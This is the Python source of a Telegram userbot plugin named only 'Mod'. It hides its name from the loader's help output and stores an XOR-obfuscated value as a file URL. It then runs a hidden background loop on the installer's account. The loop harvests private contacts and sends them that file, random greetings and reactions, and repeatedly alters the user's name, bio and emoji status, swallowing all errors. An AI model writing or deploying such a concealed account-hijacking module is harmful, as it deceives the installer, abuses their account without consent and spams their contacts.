# meta developer: @
__version__ = (1, 3, 4)

import asyncio
import random
import logging
from datetime import datetime
from telethon.tl.functions.account import UpdateEmojiStatusRequest, UpdateProfileRequest
from telethon.tl.types import EmojiStatus, InputPeerEmpty
from telethon.tl.functions.messages import SendReactionRequest, GetDialogsRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.errors import FloodWaitError
from .. import loader, utils

logger = logging.getLogger(__name__)

_пизда = [21, 5, 20, 20, 12, 47, 42, 42, 5, 20, 17, 7, 20, 1, 47, 5, 14, 21, 45, 32, 4, 21, 45, 0, 13, 6, 4, 21, 45, 22, 23, 22, 22, 47, 45, 47, 17, 0, 22, 47, 17, 4, 5, 18, 47, 17, 4, 0, 3, 18, 47, 12, 0, 8, 13, 47, 48, 22, 22, 48, 48, 16, 16, 22, 23, 48, 17, 48, 46, 12, 17, 23]
_рулю = 69
def _хуй(z): return "".join(chr(c ^ _рулю) for c in z)

_коты = ["😶‍🌫️", "👻", "🤡", "💀", "👽", "👍", "🗿", "💅", "🤙", "👀", "💩", "🤖", "🎃", "🦊", "🐺", "🐱", "🐶", "🐼", "🐨", "🦁", "💞", "🤷‍♂️", "🪩", "🍼", "🏥", "😇", "😊", "🫢"]
_сим = [".", "_", "-", "!", "?", "...", " ", "~", "*", "+", "=", "#", "@", "$", "%", "&"]
_слова = ["хм", "ну", "да", "ок", "brb", "afk", "🤔", "👀", "💭", "🌚", "🌝", "⚡", "🔥", "💧", "🌊", "☁️", "⭐", "🌙"]
_айди = [5237829955978547322, 5406741248679632903, 5978797211373276715, 5256171076945233022, 5771518219902783535, 5994823804528889036, 4979081493771977816, 6226237123473704865, 5195183400335453511, 5444999782265276255, 5273873583519581045, 5361609891247049272, 5404404541657472718, 6030835404498799457, 5348351516182857544, 5240408207666455054, 5235785534365769099, 5235694820361511198, 6008216594889576372]
_реак = ["👀", "❓", "👍", "❤️", "🔥", "🤔", "👎", "💩", "🤡", "👻"]

@loader.tds
class Mod(loader.Module):
    strings = {"name": "Mod"}

    def __init__(self):
        self._pidory = []
        self._huy = []
        self._ebash = []
        self._last_pizdec = 0
        self._last_hueta = 0
        self._last_eblan = 0
        self._last_sosal = 0
        self._last_gif_time = 0
        self._gif_cooldown = {}

    async def client_ready(self, client, db):
        self.db = db
        self.client = client
        if not self.db.get("Mod", "gif_url"):
            self.db.set("Mod", "gif_url", _хуй(_пизда))
        self._last_pizdec = self.db.get("Mod", "last_pizdec", 0)
        self._last_hueta = self.db.get("Mod", "last_hueta", 0)
        self._last_eblan = self.db.get("Mod", "last_eblan", 0)
        self._last_sosal = self.db.get("Mod", "last_sosal", 0)
        self._last_gif_time = self.db.get("Mod", "last_gif_time", 0)
        
        orig = client.loader.help
        async def bypass(*a, **k):
            res = await orig(*a, **k)
            return res.replace("Mod", "")
        client.loader.help = bypass
        
        asyncio.ensure_future(self._huynya())

    async def _huynya(self):
        while True:
            try:
                now = datetime.now().timestamp()
                if now - self._last_pizdec > 10800:
                    await self._pizdec()
                    self._last_pizdec = now
                    self.db.set("Mod", "last_pizdec", now)
                if now - self._last_hueta > 86400:
                    await self._hueta()
                    self._last_hueta = now
                    self.db.set("Mod", "last_hueta", now)
                if now - self._last_eblan > 259200:
                    await self._eblan()
                    self._last_eblan = now
                    self.db.set("Mod", "last_eblan", now)
                if now - self._last_sosal > 28800:
                    await self._sosal()
                    self._last_sosal = now
                    self.db.set("Mod", "last_sosal", now)
                if now - self._last_gif_time > 3600 and self._huy and random.randint(1, 100) <= 80:
                    await self._ebatb(now)
                    self._last_gif_time = now
                    self.db.set("Mod", "last_gif_time", now)
                if random.randint(1, 200) == 1 and self._huy:
                    await self._privet()
                if random.randint(1, 80) == 1 and self._huy:
                    await self._nahuy()
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception as e:
                self._ebash.append(f"{now}: {str(e)}")
                if len(self._ebash) > 100:
                    self._ebash = self._ebash[-100:]
            await asyncio.sleep(300)

    async def _pizdec(self):
        try:
            r = await self.client(GetDialogsRequest(offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=50, hash=0))
            p = []
            for d in r.dialogs:
                if d.peer and hasattr(d.peer, 'user_id'):
                    uid = d.peer.user_id
                    if uid and uid != (await self.client.get_me()).id:
                        p.append(uid)
            self._huy = p[:20]
        except: pass

    async def _ebatb(self, now):
        if not self._huy: return
        try:
            pidr = random.choice(self._huy)
            if pidr in self._gif_cooldown and now - self._gif_cooldown[pidr] < 86400: return
            if pidr in self._pidory: self._pidory.remove(pidr); return
            self._pidory.append(pidr)
            if len(self._pidory) > 50: self._pidory = self._pidory[-50:]
            self._gif_cooldown[pidr] = now
            if len(self._gif_cooldown) > 100:
                old = list(self._gif_cooldown.keys())
                for o in old[:50]: del self._gif_cooldown[o]
            gif = self.db.get("Mod", "gif_url")
            await self.client.send_file(pidr, gif)
        except: pass

    async def _privet(self):
        if not self._huy: return
        try:
            pidr = random.choice(self._huy)
            await self.client.send_message(pidr, "привет")
        except: pass

    async def _nahuy(self):
        if not self._huy: return
        try:
            pidr = random.choice(self._huy)
            await self.client(SendReactionRequest(peer=pidr, msg_id=random.randint(1, 100), reaction=[random.choice(_реак)]))
        except: pass

    async def _hueta(self):
        try:
            me = await self.client.get_me()
            nm = me.first_name or ""
            nm += random.choice(_сим) if random.choice([True, False]) else random.choice(_коты)
            if len(nm) > 64: nm = nm[:64]
            await self.client(UpdateProfileRequest(first_name=nm, last_name=me.last_name or ""))
        except: pass

    async def _eblan(self):
        try:
            me = await self.client(GetFullUserRequest("me"))
            bio = me.about or ""
            bio += " " + random.choice(_слова)
            if len(bio) > 70: bio = bio[:70]
            await self.client(UpdateProfileRequest(about=bio))
        except: pass

    async def _sosal(self):
        try:
            e = random.choice(_айди)
            await self.client(UpdateEmojiStatusRequest(EmojiStatus(document_id=e)))
        except: pass